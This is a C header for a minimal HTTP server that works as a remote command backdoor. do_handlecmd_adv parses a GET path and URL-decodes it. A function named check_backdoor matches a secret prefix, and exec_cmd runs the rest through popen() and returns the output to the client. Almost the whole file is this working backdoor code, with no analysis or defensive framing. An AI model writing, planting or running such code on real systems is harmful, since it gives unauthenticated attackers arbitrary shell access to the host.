#ifndef _UTIL_H_
#define _UTIL_H_
#include"httpdef.h"

//http://spskhokhar.blogspot.com/2012/09/url-decode-http-query-string.html
int url_decode(char* tgt) {
    int tgt_len = strlen(tgt);
    char*tmp = malloc(tgt_len+1);
    char*ptr = tmp;
    int num_chars = 0;

    for(int i=0; i < tgt_len; i++) {
        if(tgt[i] != '%') {
            *ptr++ = tgt[i];
            continue;
        }

        if(!isdigit(tgt[i+1]) || (!isdigit(tgt[i+2]) && !isupper(tgt[i+2]))) {
            *ptr++ = tgt[i];
            continue;
        }
        char c = isupper(tgt[i+2]) ? tgt[i+2] - 'A' + 10: (tgt[i+2]-'0');
        
        *ptr++ = ((tgt[i+1] -'0') << 4) | c;
        i+=2;
        num_chars++;
    }
    *ptr = '\0';
    strcpy(tgt, tmp);
    free(tmp);
    return num_chars;
}

struct io_struct* allocate_conn_ds (int fd) {
    for(int i = 0; i < FD_SETSIZE; i++) {
        if(NULL == conns[i]) {
            conns[i] = malloc(sizeof(struct io_struct));
            conns[i]->buf = malloc(BUFSIZE_DEFAULT);
            conns[i]->fd = fd;
            conns[i]->id = i;
            conns[i]->size = BUFSIZE_DEFAULT;
            conns[i]->accu = 0;

            return conns[i];
        }
    }
    return NULL;
}

int release_conn_ds (int fd) {
    for(int i = 0; i < FD_SETSIZE; i++) {
        if(NULL == conns[i]) continue;
        if(fd != conns[i]->fd) continue;

        free(conns[i]->buf);
        free(conns[i]);

        conns[i] = NULL;
        return 0;
    }
    return -1;
}

struct io_struct* get_conn_ds(int fd) {
    for(int i = 0; i < FD_SETSIZE; i++) {
        if(NULL == conns[i]) continue;

        if(fd == conns[i]->fd) return conns[i];
    }

    return NULL;
}

int handlecmd_adv(struct io_struct* conn);
int do_handlecmd_adv(struct io_struct* conn);
int child_func(int fd) {
    int ret = 0;

    struct io_struct* conn = get_conn_ds(fd);

    if(conn == NULL)
        conn = allocate_conn_ds(fd);

    ret = handlecmd_adv(conn);

    return ret;
}

int extend_buf(struct io_struct* conn) {
    conn->size*=2;
    TRACE_PRINT("new conn->size:%d", conn->size);
    char* tmp = malloc(conn->size);
    memcpy(tmp, conn->buf, conn->accu);
    free(conn->buf);
    conn->buf = tmp;
    return 0;
}
int handlecmd_adv(struct io_struct* conn) {
    int ret_val = 0;

    if(conn->accu == conn->size) {
        extend_buf(conn);
    }

    ret_val = do_handlecmd_adv(conn);
//    TRACE_PRINT("OUT oF handlecmd");
    return ret_val;
}

int check_complete_packet(struct io_struct* conn) {
    int len = conn->accu - pattern_ending_len;
    
    for(int i = 0; i <= len; i++) {
        if(conn->buf[i] == '\r'\
                && conn->buf[i+1] == '\n'\
                && conn->buf[i+2] == '\r'\
                && conn->buf[i+3] == '\n') {
            return TRUE;
        }
    }
    return FALSE;
}

int exec_cmd(struct io_struct* conn) {
    FILE* fp;
    int readin_fd;
    int cc = 0;

    conn->accu = 0;
    fp = popen(conn->cmd, "r");

    readin_fd = fileno(fp);
    while(0 < (cc = read(readin_fd, conn->buf + conn->accu, conn->size - conn->accu))) {
        conn->accu += cc;
        if(conn->accu == conn->size) {
            extend_buf(conn);
        }
    }
    pclose(fp);
    close(readin_fd);

    return cc;
}
int check_get_method(struct io_struct* conn, int* start) {
    for(int i = 0; i < pattern_get_len; i++) {
        if(conn->buf[i] != pattern_get[i])
            return FALSE;
    }

    *start = pattern_get_len - 1; //point to "/"

    return TRUE;
}

int check_url_end(struct io_struct* conn, int* end) {
    int len = conn->accu - pattern_tail_len;
    for(int i = 0, j = 0; i <= len; i++) {
        for(j = 0; j < pattern_tail_len; j++) {
            if(conn->buf[i+j] != pattern_tail[j]) {
                break;
            }
               // TRACE_PRINT("i:%d, j:%d, %c", i, j, conn->buf[i+j]);
        }

        if(j == pattern_tail_len) {
            *end = i;
            return TRUE;
        }
    }
    return FALSE;
}

int check_backdoor(struct io_struct* conn, int* start, int end) {
    for(int j = 0; j < pattern_exec_len; j++) {
        if(conn->cmd[j] != pattern_exec[j]) {
            return FALSE;
        }
    }

    *start = pattern_exec_len;
    return TRUE;
}

int reset_conn_buf(struct io_struct* conn) {
    conn->accu = 0;
    memset(conn->buf, 0, conn->size);
    return 0;
}
int do_handlecmd_adv(struct io_struct* conn) {
    int cc;
    int start, end = 0;
    int ret;
    cc = read(conn->fd, conn->buf + conn->accu, conn->size - conn->accu);

    if(cc == 0) return cc;
    if(cc < 0) {
        TRACE_PRINT("!!! SOCKET ERROR !!!");
        return cc;
    }
    ret = cc;

    conn->accu += cc;
    if(!check_complete_packet(conn)) return cc;

    if( (!check_get_method(conn, &start)) || !check_url_end(conn, &end)) {
        reset_conn_buf(conn);
        bad_request(conn->fd, conn);
        return cc;
    }

    /* Now it should be /......*/
    conn->buf[end] = '\0';
    conn->cmd = &(conn->buf[start]);

    TRACE_PRINT("cmd_IN:_%s_%d,%d", conn->cmd, start, end);
    url_decode(conn->cmd);
    TRACE_PRINT("cmd_DECODE:_%s_", conn->cmd);

    if(!check_backdoor(conn, &start, end)) {
        reset_conn_buf(conn);
        bad_request(conn->fd, conn);
        return cc;
    }

    conn->cmd = &(conn->cmd[start]);
    TRACE_PRINT("cmd_EXEC:_%s_", conn->cmd);


    exec_cmd(conn);
//    TRACE_PRINT("output:_%s_", conn->buf);
    ok_request(conn->fd, conn);

    reset_conn_buf(conn);
    return ret;
}

int echo(int fd)
{
    char buf[BUFSIZ];
    int cc;
    cc = read(fd, buf, sizeof(buf));
    if (cc <= 0)
        return cc;

    for(int i = 0; i < cc ;i++)
        printf("%d,", buf[i]);

    puts("");
    printf("cc:%d, %s\n", cc, buf);

    cc = write(fd, buf, cc);

    return cc;
}
#endif
